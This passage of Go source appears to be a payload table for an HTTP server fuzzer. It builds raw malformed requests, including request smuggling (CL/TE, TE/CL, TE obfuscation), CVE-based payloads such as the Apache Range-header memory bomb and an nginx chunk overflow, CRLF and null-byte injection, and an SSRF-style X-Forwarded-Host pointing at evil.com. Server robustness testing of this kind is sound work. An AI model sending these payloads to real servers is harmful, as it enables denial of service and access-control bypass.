			description: "Headers terminated with \\r\\n\\rX pattern (CVE-2025-23167)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Test: val\r\n\rX-Smuggled: yes\r\n\r\n")
			},
		},

		// ===== CHUNKED ENCODING ABUSE =====
		{
			name: "chunk_overflow_hex", category: "chunked",
			description: "Chunk size as maximum uint64 hex value",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nTransfer-Encoding: chunked\r\n\r\nFFFFFFFFFFFFFFFF\r\ndata\r\n0\r\n\r\n")
			},
		},
		{
			name: "chunk_negative_hex", category: "chunked",
			description: "Negative chunk size",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nTransfer-Encoding: chunked\r\n\r\n-1\r\ndata\r\n0\r\n\r\n")
			},
		},
		{
			name: "chunk_non_hex", category: "chunked",
			description: "Non-hexadecimal chunk size",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nTransfer-Encoding: chunked\r\n\r\nZZZZ\r\ndata\r\n0\r\n\r\n")
			},
		},
		{
			name: "chunk_size_mismatch_over", category: "chunked",
			description: "Chunk size declares 2 bytes but sends 6",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nTransfer-Encoding: chunked\r\n\r\n2\r\nABCDEF\r\n0\r\n\r\n")
			},
		},
		{
			name: "chunk_extension_bomb", category: "chunked",
			description: "Chunk with 64KB of extensions",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nTransfer-Encoding: chunked\r\n\r\n5;" + strings.Repeat("ext=val;", 8192) + "\r\nhello\r\n0\r\n\r\n")
			},
			readTimeout: 5 * time.Second,
		},
		{
			name: "double_transfer_encoding", category: "chunked",
			description: "Two Transfer-Encoding headers with different values",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n5\r\nhello\r\n0\r\n\r\n")
			},
		},

		// ===== CONTENT-LENGTH ABUSE =====
		{
			name: "cl_negative", category: "content-length",
			description: "Negative Content-Length value",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: -1\r\n\r\ndata")
			},
		},
		{
			name: "cl_overflow", category: "content-length",
			description: "Content-Length exceeding int64 range",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 99999999999999999999\r\n\r\ndata")
			},
		},
		{
			name: "cl_nan", category: "content-length",
			description: "Non-numeric Content-Length",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: abc\r\n\r\ndata")
			},
		},
		{
			name: "cl_spaces_cve_2018_7159", category: "content-length",
			description: "Spaces inside Content-Length (CVE-2018-7159 Node.js smuggling)",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 1 2\r\n\r\nhello world!!")
			},
		},
		{
			name: "cl_plus_sign", category: "content-length",
			description: "Plus sign prefix on Content-Length",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: +5\r\n\r\nhello")
			},
		},
		{
			name: "cl_leading_zeros", category: "content-length",
			description: "Leading zeros in Content-Length (octal confusion)",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 00005\r\n\r\nhello")
			},
		},

		// ===== REQUEST SMUGGLING =====
		{
			name: "smuggle_cl_te", category: "smuggling",
			description: "CL/TE request smuggling: Content-Length + Transfer-Encoding",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + host + "\r\n\r\n")
			},
		},
		{
			name: "smuggle_te_cl", category: "smuggling",
			description: "TE/CL request smuggling: Transfer-Encoding + Content-Length",
			payload: func(host string) []byte {
				smuggled := "GET /smuggled HTTP/1.1\r\nHost: " + host + "\r\n\r\n"
				chunk := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(smuggled), smuggled)
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n" + chunk)
			},
		},
		{
			name: "smuggle_te_te_obfuscation", category: "smuggling",
			description: "TE/TE obfuscation: Transfer-Encoding with case variation",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: identity\r\n\r\n0\r\n\r\n")
			},
		},
		{
			name: "smuggle_te_space", category: "smuggling",
			description: "Transfer-Encoding with leading space (parser confusion)",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 4\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\n")
			},
		},
		{
			name: "smuggle_te_tab", category: "smuggling",
			description: "Transfer-Encoding with tab before value",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 4\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\n")
			},
		},

		// ===== CVE-INSPIRED ATTACKS =====
		{
			name: "apache_range_bomb_cve_2011_3192", category: "cve",
			description: "Apache Range header bomb (CVE-2011-3192): overlapping byte ranges cause memory explosion",
			payload: func(host string) []byte {
				// Build many overlapping ranges
				ranges := "bytes=0-"
				for i := 0; i < 200; i++ {
					ranges += fmt.Sprintf(",5-%d", i)
				}
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nRange: " + ranges + "\r\nConnection: close\r\n\r\n")
			},
			readTimeout: 10 * time.Second,
		},
		{
			name: "range_many_overlapping", category: "cve",
			description: "1000 overlapping Range values",
			payload: func(host string) []byte {
				ranges := "bytes=0-"
				for i := 0; i < 1000; i++ {
					ranges += fmt.Sprintf(",%d-%d", i, i+100)
				}
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nRange: " + ranges + "\r\nConnection: close\r\n\r\n")
			},
			readTimeout: 10 * time.Second,
		},
		{
			name: "nginx_chunk_overflow_cve_2013_2028", category: "cve",
			description: "Nginx chunked encoding integer overflow (CVE-2013-2028)",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nTransfer-Encoding: chunked\r\n\r\nFFFFFFFFFFFFFFFE\r\n" + strings.Repeat("A", 1024) + "\r\n0\r\n\r\n")
			},
			readTimeout: 5 * time.Second,
		},

		// ===== CONNECTION-LEVEL TRICKS =====
		{
			name: "garbage_after_request", category: "connection",
			description: "Binary garbage after valid request on keep-alive connection",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n\x00\x01\x02\x03\xff\xfe\xfd\xfc")
			},
		},
		{
			name: "pipeline_then_garbage", category: "connection",
			description: "Valid pipelined request followed by binary garbage",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\nGET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n\x00\xff\xfe\xfd")
			},
		},
		{
			name: "pure_binary", category: "connection",
			description: "Pure binary data instead of HTTP request",
			payload: func(_ string) []byte {
				return []byte("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\xff\xfe\xfd\xfc\xfb\xfa")
			},
		},
		{
			name: "tls_clienthello_on_http", category: "connection",
			description: "TLS ClientHello record sent to HTTP port",
			payload: func(_ string) []byte {
				return []byte{0x16, 0x03, 0x01, 0x00, 0x05, 0x01, 0x00, 0x00, 0x01, 0x03}
			},
		},
		{
			name: "websocket_upgrade_garbage", category: "connection",
			description: "WebSocket upgrade followed by binary garbage",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n\x00\x01\x02\x03\x04\x05")
			},
		},

		// ===== BODY/ENCODING CONFUSION =====
		{
			name: "cl_body_mismatch_large", category: "body",
			description: "Content-Length: 1MB but empty body (server hangs waiting)",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 1048576\r\nConnection: close\r\n\r\n")
			},
			readTimeout: 15 * time.Second,
		},
		{
			name: "cl_zero_body_1mb", category: "body",
			description: "Content-Length: 0 but send 1MB body (extra data on connection)",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 0\r\n\r\n" + strings.Repeat("X", 1<<20))
			},
		},
		{
			name: "expect_100_no_body", category: "body",
			description: "Expect: 100-continue with 1MB Content-Length but no body sent",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 1048576\r\nExpect: 100-continue\r\n\r\n")
			},
			readTimeout: 10 * time.Second,
		},
		{
			name: "cl_and_te", category: "body",
			description: "Both Content-Length and Transfer-Encoding (RFC violation)",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
			},
		},

		// ===== MULTIPART EDGE CASES =====
		{
			name: "multipart_no_boundary", category: "multipart",
			description: "Multipart Content-Type without boundary parameter",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Type: multipart/form-data\r\nContent-Length: 10\r\n\r\n1234567890")
			},
		},
		{
			name: "multipart_nested_deep", category: "multipart",
			description: "Deeply nested multipart (10 levels)",
			payload: func(host string) []byte {
				body := ""
				for i := 0; i < 10; i++ {
					body += fmt.Sprintf("--%d\r\nContent-Type: multipart/form-data; boundary=%d\r\n\r\n", i, i+1)
				}
				body += "--10\r\nContent-Disposition: form-data; name=\"f\"\r\n\r\ndata\r\n--10--\r\n"
				for i := 9; i >= 0; i-- {
					body += fmt.Sprintf("--%d--\r\n", i)
				}
				return []byte(fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Type: multipart/form-data; boundary=0\r\nContent-Length: %d\r\n\r\n%s", host, len(body), body))
			},
		},

		// ===== ENCODING TRICKS =====
		{
			name: "high_bytes_in_method", category: "encoding",
			description: "Non-ASCII bytes in HTTP method (overlong UTF-8)",
			payload: func(host string) []byte {
				return []byte("G\xc0\xafET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n")
			},
		},
		{
			name:     "control_chars_in_header", category: "encoding",
			description: "Control characters (backspace, form feed, vertical tab, DEL) in header",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Test: \x08\x0b\x0c\x7f\r\n\r\n")
			},
		},

		// ===== EMOJI & UNICODE ATTACKS =====
		{
			name: "emoji_in_method", category: "unicode",
			description: "Emoji characters as HTTP method (crashes ASCII-only parsers)",
			payload: func(host string) []byte {
				return []byte("\xF0\x9F\x94\xA5 / HTTP/1.1\r\nHost: " + host + "\r\n\r\n") // 🔥 as method
			},
		},
		{
			name: "emoji_in_uri", category: "unicode",
			description: "Emoji in URI path (non-percent-encoded)",
			payload: func(host string) []byte {
				return []byte("GET /\xF0\x9F\x92\xA9/path HTTP/1.1\r\nHost: " + host + "\r\n\r\n") // 💩 in path
			},
		},
		{
			name: "emoji_in_host", category: "unicode",
			description: "Emoji in Host header value",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: \xF0\x9F\x8C\x90." + host + "\r\n\r\n") // 🌐 prefix
			},
		},
		{
			name: "emoji_in_header_name", category: "unicode",
			description: "Emoji as header name (completely illegal)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\n\xF0\x9F\x94\xA5: fire\r\n\r\n")
			},
		},
		{
			name: "emoji_in_header_value", category: "unicode",
			description: "Emoji in header value",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Emoji: \xF0\x9F\x98\x88\xF0\x9F\x91\xBB\xF0\x9F\x92\xA3\r\n\r\n")
			},
		},
		{
			name: "zalgo_header", category: "unicode",
			description: "Zalgo combining diacritics in header value (renders corruption)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Zalgo: h\xcc\xa8\xcc\xa9\xcc\xaee\xcc\xa8\xcc\xa9l\xcc\xa8p\r\n\r\n")
			},
		},
		{
			name: "rtl_override_header", category: "unicode",
			description: "Right-to-left override in header (confuses log parsers)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-RTL: normal\xe2\x80\xaedesrever\r\n\r\n") // U+202E RLO
			},
		},
		{
			name: "zero_width_in_method", category: "unicode",
			description: "Zero-width spaces inside HTTP method",
			payload: func(host string) []byte {
				return []byte("G\xe2\x80\x8bE\xe2\x80\x8bT / HTTP/1.1\r\nHost: " + host + "\r\n\r\n") // ZWS between letters
			},
		},
		{
			name: "overlong_utf8_slash", category: "unicode",
			description: "Overlong UTF-8 encoding of / (security bypass pattern)",
			payload: func(host string) []byte {
				return []byte("GET \xc0\xaf HTTP/1.1\r\nHost: " + host + "\r\n\r\n") // Overlong /
			},
		},
		{
			name: "ansi_escape_in_header", category: "unicode",
			description: "ANSI escape sequences in header (crashes terminal log viewers)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Color: \x1b[31mRED\x1b[0m\r\nX-Bell: \x07\x07\r\n\r\n")
			},
		},
		{
			name: "latin1_in_utf8_host", category: "unicode",
			description: "Latin-1 high bytes in Host header (encoding confusion)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: caf\xe9." + host + "\r\n\r\n") // café with Latin-1 é
			},
		},
		{
			name: "fullwidth_method", category: "unicode",
			description: "Fullwidth ASCII characters as HTTP method (looks like GET but isn't)",
			payload: func(host string) []byte {
				return []byte("\xef\xbc\xa7\xef\xbc\xa5\xef\xbc\xb4 / HTTP/1.1\r\nHost: " + host + "\r\n\r\n") // ＧＥＴ
			},
		},
		{
			name: "homoglyph_host", category: "unicode",
			description: "Cyrillic homoglyphs in Host header (а looks like a)",
			payload: func(host string) []byte {
				// Replace 'a' with Cyrillic 'а' (U+0430) in host
				return []byte("GET / HTTP/1.1\r\nHost: \xd0\xb0\xd1\x80\xd1\x80le.com\r\n\r\n") // аррle.com
			},
		},
		{
			name: "mixed_line_endings_unicode", category: "unicode",
			description: "Unicode line separator (LS) and paragraph separator (PS) as line endings",
			payload: func(host string) []byte {
				// U+2028 Line Separator, U+2029 Paragraph Separator
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\xe2\x80\xa8X-After-LS: val\r\n\r\n")
			},
		},
		// --- CVE-INSPIRED ATTACKS ---
		{
			name: "crlf_injection_location", category: "cve",
			description: "CRLF injection in header value (CVE-2019-9740 pattern)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Inject: val\r\nInjected: yes\r\n\r\n")
			},
		},
		{
			name: "giant_header_value", category: "cve",
			description: "65KB header value to trigger buffer overflow or allocation crash",
			payload: func(host string) []byte {
				bigVal := strings.Repeat("A", 65536)
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Big: " + bigVal + "\r\n\r\n")
			},
		},
		{
			name: "null_in_uri", category: "cve",
			description: "Null byte in URI path (CVE-2013-4547 pattern)",
			payload: func(host string) []byte {
				return []byte("GET /admin\x00.html HTTP/1.1\r\nHost: " + host + "\r\n\r\n")
			},
		},
		{
			name: "space_in_header_name", category: "cve",
			description: "Whitespace in header name (RFC violation, crashes strict parsers)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX Bad Name: value\r\n\r\n")
			},
		},
		{
			name: "duplicate_content_length", category: "cve",
			description: "Duplicate Content-Length headers (request smuggling)",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 5\r\nContent-Length: 0\r\n\r\nhello")
			},
		},
		{
			name: "chunked_unicode_te", category: "cve",
			description: "Transfer-Encoding with overlong UTF-8 (smuggling bypass)",
			payload: func(host string) []byte {
				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nTransfer-Encoding: chunked\xc0\xae\r\n\r\n0\r\n\r\n")
			},
		},
		{
			name: "ssrf_forwarded_host", category: "cve",
			description: "X-Forwarded-Host with @ for SSRF (CVE-2021-40438 pattern)",
			payload: func(host string) []byte {
				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Forwarded-Host: evil.com:@internal:8080\r\n\r\n")
			},
		},
	}
}
